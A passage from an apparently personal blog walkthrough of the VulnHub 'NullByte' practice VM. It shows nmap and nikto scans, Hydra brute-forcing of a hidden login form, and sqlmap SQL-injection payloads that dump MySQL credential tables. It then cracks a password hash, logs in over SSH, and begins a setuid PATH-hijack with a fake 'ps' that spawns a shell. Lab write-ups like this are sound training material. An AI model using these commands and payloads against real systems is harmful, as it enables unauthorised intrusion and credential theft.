</span><span class='line'>Uptime guess: 0.029 days (since Mon Aug 17 06:25:06 2015)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>TCP Sequence Prediction: Difficulty=264 (Good luck!)
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.44 ms 10.1.1.134&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at &lt;a href="https://nmap.org/submit/">https://nmap.org/submit/&lt;/a> .&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Nmap done at Mon Aug 17 07:06:29 2015 &ndash; 1 IP address (1 host up) scanned in 16.18 seconds&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>I found that the port 777 is running SSH and apache 2.4.10 is running on port 80, and the server is Debian Linux with 3.x kernel.</p>

<p>Then I use <code>nikto</code> to scan if any known vulnerabilty can be found which will be a life saver.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          10.1.1.134&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    10.1.1.134&lt;/li>
</span><span class='line'>&lt;li>Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-08-17 07:01:56 (GMT-4)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.4.10 (Debian)&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, fields: 0xc4 0x51c42a5c32a70&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li>
</span><span class='line'>&lt;li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/li>
</span><span class='line'>&lt;li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)&lt;/li>
</span><span class='line'>&lt;li>Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.&lt;/li>
</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li>
</span><span class='line'>&lt;li>Uncommon header &lsquo;x-ob_mode&rsquo; found, with contents: 0&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>/phpmyadmin/: phpMyAdmin directory found&lt;/li>
</span><span class='line'>&lt;li>7668 requests: 0 error(s) and 9 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-08-17 07:02:17 (GMT-4) (21 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>Nothing too exciting, but found phpmyadmin installed and a folder <code>/phpmyadmin/</code>.</p>

<h3>Secret in the Pic</h3>

<p>Then I tried default password and some weak passwords with login phpmyadmin, but all failed.</p>

<p>Then I open iceweasel browser to have a close look at the website. There is only a picture with a sentence <code>If you search for the laws of harmony, you will find knowledge.</code></p>

<p>Nothing wrong about the sentence&hellip; but hint is hidden in the picture&hellip;</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ strings main.gif
</span><span class='line'>GIF89a
</span><span class='line'>P-): kzMb5nVYJw
</span><span class='line'>cccIII@@@GGG444999`&ldquo;&lt;&lt;&lt;
</span><span class='line'>ooo>>>EEE
</span><span class='line'>???^^^
</span><span class='line'>HHH;;;
</span><span class='line'>gggRRRJJJ+++
</span><span class='line'>TTTZZZ
</span><span class='line'>QQQ///
</span><span class='line'>~~~&rdquo;&lsquo;CCC
</span><span class='line'>   AAA
</span><span class='line'>aaa222
</span><span class='line'>&hellip; &hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>Pay attention to the second line below the <code>GIF89a</code>:</p>

<p><code>P-): kzMb5nVYJw</code></p>

<p>Then I tried to use the string &lsquo;kzMb5nVYJw&rsquo; as an hidden folder and found the hidden login page:</p>

<p><img class="left" src="/downloads/nullbyte1/1.png"></p>

<p>From the source code, I noticed that this form is not connected to mysql and password is not complex&hellip; so here would be an online brute force attacking based on password-dict.</p>

<p>I use Hydra with rockyou.txt dictionary to brute force the login form and got the password: <code>elite</code>. (The parameter <code>-l admin</code> does not make any sense, just get rid of errors)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.1.1.134 http-post-form &ldquo;/kzMb5nVYJw/index.php:key=^PASS^:invalid&rdquo;
</span><span class='line'>[sudo] password for F4l13n:
</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-08-17 09:20:13
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort&hellip;
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
</span><span class='line'>[DATA] attacking service http-post-form on port 80
</span><span class='line'>[80][http-post-form] host: 10.1.1.134   login: admin   password: elite
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-08-17 09:20:57</span></code></pre></td></tr></table></div></figure></p>

<p>When I logged in with password <code>elite</code>, I have been forwarded to the following username searching page.</p>

<p><img class="left" src="/downloads/nullbyte1/2.png"></p>

<p>After tired several common SQLi test, I found SQL injection vulnerability exists in the parameter <code>usrtosearch</code>, the injection point is <code>http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=admin</code></p>

<p>Then I use SQLMAP to finish all the rest works:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;dbs
</span><span class='line'>&hellip; &hellip;
</span><span class='line'>[09:45:30] [WARNING] in OR boolean-based injections, please consider usage of switch &lsquo;&ndash;drop-set-cookie&rsquo; if you experience any problems during data retrieval
</span><span class='line'>URI parameter &lsquo;#1*&rsquo; is vulnerable. Do you want to keep testing the others (if any)? [y/N]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>Parameter: #1* (URI)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
</span><span class='line'>    Payload: &lt;a href="http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162">http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162&lt;/a>" OR 3808=3808#&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>Type: AND/OR time-based blind
</span><span class='line'>Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)
</span><span class='line'>Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" AND (SELECT * FROM (SELECT(SLEEP(5)))hjFz)#
</span><span class='line'>
</span><span class='line'>Type: UNION query
</span><span class='line'>Title: MySQL UNION query (NULL) - 3 columns
</span><span class='line'>Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x6845736a5777725a736a,0x71706b7a71)#
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p>[09:45:32] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[09:45:32] [INFO] fetching database names
</span><span class='line'>available databases [5]:
</span><span class='line'>[&lt;em>] information_schema
</span><span class='line'>[&lt;/em>] mysql
</span><span class='line'>[&lt;em>] performance_schema
</span><span class='line'>[&lt;/em>] phpmyadmin
</span><span class='line'>[*] seth&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[09:45:33] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[*] shutting down at 09:45:33</span></code></pre></td></tr></table></div></figure></p>

<p>Checking the databases to grab passwords:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;batch &ndash;smart &ndash;dump -C User,Password,Host,Super_priv -T user -D mysql&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&hellip; &hellip;
</span><span class='line'>Database: mysql
</span><span class='line'>Table: user
</span><span class='line'>[6 entries]
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| User             | Password                                              | Host      | Super_priv |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| root             | &lt;em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | Y          |
</span><span class='line'>| root             | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | nullbyte  | Y          |
</span><span class='line'>| root             | &lt;em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | 127.0.0.1 | Y          |
</span><span class='line'>| root             | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | ::1       | Y          |
</span><span class='line'>| debian-sys-maint | &lt;em>BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC             | localhost | Y          |
</span><span class='line'>| phpmyadmin       | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | N          |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[09:56:13] [WARNING] table &lsquo;mysql.&lt;code>user&lt;/code>&rsquo; dumped to CSV file &lsquo;/root/.sqlmap/output/10.1.1.134/dump/mysql/user-f3649c95.csv&rsquo;
</span><span class='line'>[09:56:13] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[*] shutting down at 09:56:13</span></code></pre></td></tr></table></div></figure></p>

<p>Found mysql database login (this also can be used to login phpmyadmin): <code>root / sunnyvale</code></p>

<h3>Be ramses!</h3>

<p>There is another users table in database <code>seth</code>, which including the password hash of user <code>ramses</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;batch &ndash;smart &ndash;dump -T users -D seth
</span><span class='line'>&hellip; &hellip;
</span><span class='line'>[10:12:15] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[10:12:15] [INFO] fetching columns &lsquo;position, user, id, pass&rsquo; for table &lsquo;users&rsquo; in database &lsquo;seth&rsquo;
</span><span class='line'>[10:12:15] [INFO] fetching entries of column(s) &lsquo;&lt;code>position&lt;/code>, &lt;code>user&lt;/code>, id, pass&rsquo; for table &lsquo;users&rsquo; in database &lsquo;seth&rsquo;
</span><span class='line'>[10:12:15] [INFO] analyzing table dump for possible password hashes
</span><span class='line'>Database: seth
</span><span class='line'>Table: users
</span><span class='line'>[2 entries]
</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| id | user   | position   | pass                                        |
</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
</span><span class='line'>| 1  | ramses | &lt;blank>    | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
</span><span class='line'>| 2  | isis   | employee   | &ndash;not allowed&ndash;                             |
</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[10:12:15] [INFO] table &lsquo;seth.users&rsquo; dumped to CSV file &lsquo;/root/.sqlmap/output/10.1.1.134/dump/seth/users.csv&rsquo;
</span><span class='line'>[10:12:15] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[*] shutting down at 10:12:15</span></code></pre></td></tr></table></div></figure></p>

<p>Found user login credentials: <code>ramses / YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p>

<p>Base64 decoded the encrypted password and got a MD5 hash: <code>c6d6bd7ebf806f43c76acc3681703b81</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | base64 -d
</span><span class='line'>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input</span></code></pre></td></tr></table></div></figure></p>

<p>Then crack the MD5 hash to get password in plaintext, which is <code>omega</code></p>

<p>Then downloading <code>/etc/passwd</code> for further enumeration.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span><span class='line'>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span><span class='line'>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span><span class='line'>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span><span class='line'>messagebus:x:104:111::/var/run/dbus:/bin/false
</span><span class='line'>avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
</span><span class='line'>Debian-exim:x:106:114::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:107:65534::/var/lib/nfs:/bin/false
</span><span class='line'>colord:x:108:117:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span><span class='line'>sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>saned:x:110:119::/var/lib/saned:/bin/false
</span><span class='line'>hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
</span><span class='line'>eric:x:1001:1001:,,,:/home/eric:/bin/bash
</span><span class='line'>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>ramses:x:1002:1002:,,,:/home/ramses:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>user <code>ramses</code> found in <code>/etc/passwd</code> file.</p>

<p>From previous findings, I know SSH is open on port 777, so try to SSH login with cracked password <code>ramses / omega</code> and bingo!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte/sqlmap_rst$ ssh &lt;a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#114;&#x61;&#x6d;&#x73;&#x65;&#x73;&#64;&#x31;&#48;&#46;&#49;&#46;&#49;&#46;&#x31;&#51;&#52;">&#x72;&#97;&#x6d;&#115;&#101;&#x73;&#x40;&#x31;&#x30;&#46;&#49;&#46;&#49;&#46;&#x31;&#x33;&#52;&lt;/a> -p 777
</span><span class='line'>&lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#114;&#97;&#x6d;&#115;&#x65;&#x73;&#64;&#49;&#x30;&#x2e;&#x31;&#46;&#49;&#46;&#x31;&#x33;&#52;">&#x72;&#97;&#109;&#115;&#x65;&#x73;&#64;&#x31;&#x30;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;&#x33;&#x34;&lt;/a>&rsquo;s password:&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
</span><span class='line'>ramses@NullByte:~$ id
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
</span><span class='line'>ramses@NullByte:~$ pwd
</span><span class='line'>/home/ramses
</span><span class='line'>ramses@NullByte:~$</span></code></pre></td></tr></table></div></figure></p>

<p>Now I am ramses!</p>

<h3>Privilege Escalation</h3>

<p>Looking around and found interesting program <code>procwatch</code> which has <code>setuid</code> set in the folder <code>/var/www/backup</code></p>

<p>By running the program and analysing the outcome, I can recognize that it calls system command <code>ps</code> in the program. However the program does not use full path of <code>ps</code>, so here is mis-configuration vulnerability which could be exploited by an attacker to make fake <code>ps</code> and set <code>$PATH</code> to get ROOT privilege.</p>

<p>Then I wrote a shell script and saved as &lsquo;ps&rsquo;, and grant executable permition for it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat ps&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>!/bin/sh&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>/bin/sh&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>chmod +x ps&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Then change the environment variable <code>$PATH</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
</span><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure></p>
